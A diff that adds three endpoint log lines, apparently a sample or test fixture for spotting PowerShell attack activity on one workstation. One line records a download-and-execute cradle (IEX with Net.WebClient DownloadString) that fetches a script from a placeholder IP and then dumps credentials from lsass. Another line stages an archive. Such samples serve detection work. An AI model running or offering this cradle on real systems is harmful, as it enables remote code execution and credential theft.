@@ -1,0 +1,3 @@
+2026-06-07T03:21:13Z host=ACME-WS-014 user=alice script=Invoke-WebRequest uri=http://updates.acme-cdn.example/check.ps1 action=download path=C:\ProgramData\Acme\check.ps1
+2026-06-07T03:25:44Z host=ACME-WS-014 user=alice script=IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.77/a.ps1'); Invoke-CredDump -Target lsass action=credential_dump
+2026-06-07T03:26:02Z host=ACME-WS-014 user=alice script=Compress-Archive C:\ProgramData\Acme\cache C:\ProgramData\Acme\cache.zip action=archive_stage
